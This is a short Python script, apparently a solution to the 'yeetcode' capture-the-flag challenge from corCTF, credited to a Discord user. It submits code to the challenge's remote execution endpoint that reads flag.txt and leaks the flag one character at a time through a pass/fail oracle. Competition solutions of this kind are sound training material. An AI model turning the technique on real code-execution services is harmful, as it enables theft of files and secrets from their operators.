#This was taken from careless_finch#0001 on Discord

import requests
from string import digits, ascii_lowercase

flag='corctf{'

while flag[-1]!='}':
    for i in digits+ascii_lowercase+'_}': #dictionary
        data = f'def f(a,b):\n q=open("flag.txt").read().strip()\n if q[:{len(flag)+1}]=="{flag+i}":\n  print(a+b)'
        response = requests.post('https://yeetcode.be.ax/yeetyeet', data=data)
        print(flag+i,end='\r')
        if response.json()['f']==9:
            flag+=i
            break
print("flag:",flag)